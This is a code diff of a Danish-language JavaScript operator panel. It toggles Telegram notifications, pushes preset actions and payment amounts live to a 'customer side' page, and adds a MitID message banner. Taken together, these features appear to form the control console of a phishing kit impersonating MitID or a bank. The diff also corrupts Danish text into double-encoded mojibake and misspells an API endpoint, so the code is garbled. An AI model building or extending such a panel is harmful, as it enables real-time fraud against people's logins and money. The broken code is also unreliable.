+   Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â */
 function renderTelegram(){
   if(!state || !state.telegram) return;
   const t = state.telegram;
@@ -671,19 +671,19 @@ function renderTelegram(){
   const ready = !!(t.enabled && t.hasToken && t.hasChatId);
   dot.classList.toggle('live', !!t.enabled);
   dot.classList.toggle('warn', !!t.enabled && !ready);
-  textEl.textContent = !t.enabled ? 'SlÃ¥et fra'
-    : (!ready ? 'SlÃ¥et til â€” men mangler token/chat-ID' : 'Aktiv â€” sender notifikationer');
-  toggleBtn.textContent = t.enabled ? 'SLÃ… FRA' : 'SLÃ… TIL';
+  textEl.textContent = !t.enabled ? 'SlÃƒÂ¥et fra'
+    : (!ready ? 'SlÃƒÂ¥et til Ã¢â‚¬â€ men mangler token/chat-ID' : 'Aktiv Ã¢â‚¬â€ sender notifikationer');
+  toggleBtn.textContent = t.enabled ? 'SLÃƒâ€¦ FRA' : 'SLÃƒâ€¦ TIL';
   toggleBtn.classList.toggle('is-on', !!t.enabled);
 
   const tokEl = document.getElementById('telegramToken');
   if (tokEl && document.activeElement !== tokEl) {
-    if (t.hasToken) { tokEl.value = ''; tokEl.placeholder = 'Gemt âœ“ (skriv for at skifte)'; }
+    if (t.hasToken) { tokEl.value = ''; tokEl.placeholder = 'Gemt Ã¢Å“â€œ (skriv for at skifte)'; }
     else { tokEl.placeholder = '123456789:AAE... (fra @BotFather)'; }
   }
   const chatEl = document.getElementById('telegramChatId');
   if (chatEl && document.activeElement !== chatEl && t.hasChatId) {
-    chatEl.placeholder = 'Gemt âœ“ (skriv for at skifte)';
+    chatEl.placeholder = 'Gemt Ã¢Å“â€œ (skriv for at skifte)';
   }
 
   document.getElementById('telegramLastSent').textContent = fmtTime(t.lastSentAt);
@@ -691,7 +691,7 @@ function renderTelegram(){
   const errEl = document.getElementById('telegramErr');
   if (t.lastError) { errEl.textContent = 'Fejl: ' + t.lastError; errEl.className = 'tg-err'; }
   else if (ready)  { errEl.textContent = 'OK'; errEl.className = 'tg-ok'; }
-  else             { errEl.textContent = 'â€”'; errEl.className = ''; }
+  else             { errEl.textContent = 'Ã¢â‚¬â€'; errEl.className = ''; }
 }
 
 async function telegramToggleClick(){
@@ -735,9 +735,9 @@ document.addEventListener('click', function(e){
   if(e.target && e.target.id === 'telegramTestBtn') telegramTestClick();
 });
 
-/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
-   PRESET-CHIPS â€” fÃ¦rdiglavede handlinger (klik = udfyld + vis)
-   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
+/* Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â
+   PRESET-CHIPS Ã¢â‚¬â€ fÃƒÂ¦rdiglavede handlinger (klik = udfyld + vis)
+   Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â */
 document.addEventListener('click', async function(e){
   const chip = e.target.closest ? e.target.closest('.preset-chip') : null;
   if(!chip) return;
@@ -748,7 +748,7 @@ document.addEventListener('click', async function(e){
   if (focusId === 'actionAmount' && !amountEl.value.trim()) {
     amountEl.focus();
   }
-  // vis straks pÃ¥ kundesiden med preset-teksten
+  // vis straks pÃƒÂ¥ kundesiden med preset-teksten
   await setFlow('action', {
     title,
     amount: document.getElementById('actionAmount').value.trim(),
@@ -756,7 +756,7 @@ document.addEventListener('click', async function(e){
   });
   flashSave('actionSaveMsg');
 });
-/* â•â•â• MITID BESKED banner â•â•â• */
+/* Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â MITID BESKED banner Ã¢â€¢ÂÃ¢â€¢ÂÃ¢â€¢Â */
 async function mitidBeskedSend(){
   const text = document.getElementById('mitidBeskedTekst').value.trim();
   try {
@@ -771,6 +771,34 @@ async function mitidBeskedSkjul(){
   } catch(e) {}
 }
 document.addEventListener('click', function(e){
-  if (e.target && e.target.id === 'mitidBeskedSend') mitidBeskedSend();
-  if (e.target && e.target.id === 'mitidBeskedSkjul') mitidBeskedSkjul();
+  if (e.target && e.target.id === 'broadcastSend') { apiPost('/api/besked-banner', { visible: true, text: document.getElementById('broadcastText').value.trim(), type: broadcastType }).then(() => flashSave('actionSaveMsg')); }
+  if (e.target && e.target.id === 'broadcastClear') { apiPost('/api/beskd-banner', { visible: false }).then(() => {}); }
+});
+/* ── Broadcast type-vælger ── */
+let broadcastType = 'info';
+document.querySelectorAll('.broadcast-type').forEach(btn => {
+  btn.addEventListener('click', () => {
+    document.querySelectorAll('.broadcast-type').forEach(b => { b.classList.remove('border-blue-500','bg-blue-500/10','text-blue-400'); b.classList.add('border-gray-600','text-gray-400'); });
+    const colors = { info: 'border-blue-500 bg-blue-500/10 text-blue-400', success: 'border-emerald-500 bg-emerald-500/10 text-emerald-400', warning: 'border-rose-500 bg-rose-500/10 text-rose-400' };
+    const c = colors[btn.dataset.btype] || colors.info;
+    btn.classList.remove('border-gray-600','text-gray-400');
+    btn.classList.add(...c.split(' '));
+    broadcastType = btn.dataset.btype;
+  });
+});
+
+/* ── Beløb presets ── */
+document.querySelectorAll('[data-amount]').forEach(btn => {
+  btn.addEventListener('click', () => {
+    const amountField = document.getElementById('actionAmount');
+    if (amountField) amountField.value = btn.dataset.amount + ',00 kr.';
+  });
+});
+
+/* ── Ryd beløb ── */
+document.addEventListener('click', function(e){
+  if (e.target && e.target.id === 'actionClearBtn') {
+    const a = document.getElementById('actionAmount');
+    if (a) a.value = '';
+  }
 });
